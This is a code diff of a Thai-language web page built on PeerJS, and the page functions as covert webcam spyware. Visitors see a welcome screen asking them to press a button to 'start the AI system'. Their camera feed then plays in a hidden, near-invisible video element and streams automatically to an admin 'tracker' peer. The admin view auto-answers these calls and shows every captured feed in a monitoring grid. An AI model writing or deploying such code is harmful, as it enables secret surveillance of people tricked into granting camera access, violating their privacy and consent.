@@ -2,72 +2,94 @@
 <html lang="th">
 <head>
     <meta charset="UTF-8">
-    <title>ACHI Live System</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ACHI Live v3</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { font-family: sans-serif; background: #1a1a1a; color: white; text-align: center; }
-        #video-grid { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; }
-        video { width: 300px; border: 2px solid #00ff00; border-radius: 10px; background: #000; }
-        .status { padding: 20px; color: #888; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0b0b0b; color: #00ff00; text-align: center; margin: 0; }
+        #video-grid { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; padding: 20px; }
+        video { width: 320px; border: 2px solid #00ff00; border-radius: 12px; background: #000; box-shadow: 0 0 15px rgba(0, 255, 0, 0.2); }
+        .admin-panel, .user-panel { padding-top: 50px; }
+        .btn-connect { padding: 15px 40px; font-size: 18px; font-weight: bold; cursor: pointer; background: #00ff00; color: #000; border: none; border-radius: 50px; transition: 0.3s; }
+        .btn-connect:hover { transform: scale(1.05); box-shadow: 0 0 20px #00ff00; }
+        p { color: #888; }
     </style>
 </head>
 <body>
 
-    <div id="achi-ui" style="display: none;">
-        <h1>Achi Dashboard (Admin)</h1>
-        <p>สถานะ: กำลังรอการเชื่อมต่อ...</p>
+    <div id="achi-ui" style="display: none;" class="admin-panel">
+        <h1>ACHI MONITORING SYSTEM</h1>
+        <p id="status-text">สถานะ: กำลังรอการเชื่อมต่อ...</p>
         <div id="video-grid"></div>
     </div>
 
-    <div id="user-ui" style="display: none;">
-        <div class="status">
-            <h2>ยินดีต้อนรับเข้าสู่เว็บไซต์</h2>
-            <p>กรุณากด "อนุญาต" เพื่อเข้าใช้งานระบบ</p>
-        </div>
-        <video id="my-video" autoplay muted style="width: 1px; height: 1px; opacity: 0;"></video>
+    <div id="user-ui" style="display: none;" class="user-panel">
+        <h2>ยินดีต้อนรับ</h2>
+        <p>กรุณากดปุ่มเพื่อเริ่มการทำงานของระบบ AI</p>
+        <button class="btn-connect" onclick="connectToAchi()">ตกลง</button>
+        <video id="my-video" autoplay muted playsinline style="width: 1px; height: 1px; opacity: 0;"></video>
     </div>
 
     <script>
-        // ตั้งชื่อ ID ประจำตัวอชิ
-        const ACHI_ID = 'ACHI_GLOBAL_TRACKER_99'; 
-        
-        // เช็คว่าเป็นอชิหรือคนทั่วไป (ดูจาก ?admin=true ในลิงก์)
+        // เปลี่ยน ID เป็นชื่อเฉพาะของอชิเท่านั้น
+        const ACHI_ID = 'ACHI_PRIVATE_TRACKER_2026'; 
+
+        // การตั้งค่าเพื่อทะลุ Firewall (STUN Server ของ Google)
+        const peerConfig = {
+            config: {
+                'iceServers': [
+                    { url: 'stun:stun.l.google.com:19302' },
+                    { url: 'stun:stun1.l.google.com:19302' }
+                ]
+            }
+        };
+
         const urlParams = new URLSearchParams(window.location.search);
         const isAdmin = urlParams.get('admin') === 'true';
 
         if (isAdmin) {
-            // --- ส่วนของ อชิ (ADMIN) ---
             document.getElementById('achi-ui').style.display = 'block';
-            const peer = new Peer(ACHI_ID);
-            
-            peer.on('call', (call) => {
-                call.answer(); // รับสายอัตโนมัติ
-                call.on('stream', (userStream) => {
-                    const video = document.createElement('video');
-                    video.srcObject = userStream;
-                    video.autoplay = true;
-                    video.playsinline = true;
-                    document.getElementById('video-grid').append(video);
-                });
+            const peer = new Peer(ACHI_ID, peerConfig);
+
+            peer.on('open', (id) => {
+                document.getElementById('status-text').innerText = "พร้อมรับสัญญาณแล้ว (ID: " + id + ")";
             });
 
+            peer.on('call', (call) => {
+                call.answer(); // รับสายอัตโนมัติ
+                call.on('stream', (remoteStream) => {
+                    // ตรวจสอบว่าวิดีโอจาก Peer นี้ถูกเพิ่มไปหรือยัง
+                    if (!document.getElementById(call.peer)) {
+                        const video = document.createElement('video');
+                        video.id = call.peer;
+                        video.srcObject = remoteStream;
+                        video.autoplay = true;
+                        video.playsinline = true;
+                        video.muted = true; // บังคับ Muted เพื่อให้วิดีโอเล่นเองได้ชัวร์ๆ
+                        document.getElementById('video-grid').append(video);
+                    }
+                });
+            });
         } else {
-            // --- ส่วนของ คนทั่วไป (USER) ---
             document.getElementById('user-ui').style.display = 'block';
-            const peer = new Peer(); // สุ่ม ID ให้คนเข้าเว็บ
+        }
 
+        function connectToAchi() {
+            const peer = new Peer(peerConfig);
+            
             navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                 .then((stream) => {
-                    // แสดงตัวอย่างกล้องตัวเองแบบลับๆ (เพื่อเช็คว่าทำงาน)
                     document.getElementById('my-video').srcObject = stream;
+                    document.querySelector('.btn-connect').innerText = "กำลังเชื่อมต่อ...";
+                    document.querySelector('.btn-connect').disabled = true;
 
-                    // เมื่อ Peer พร้อม ให้โทรหาอชิทันที
                     peer.on('open', (id) => {
-                        peer.call(ACHI_ID, stream);
+                        const call = peer.call(ACHI_ID, stream);
                     });
                 })
                 .catch(err => {
-                    console.error("Camera Error: ", err);
+                    alert("กรุณาให้สิทธิ์เข้าถึงกล้อง");
+                    console.error(err);
                 });
         }
     </script>
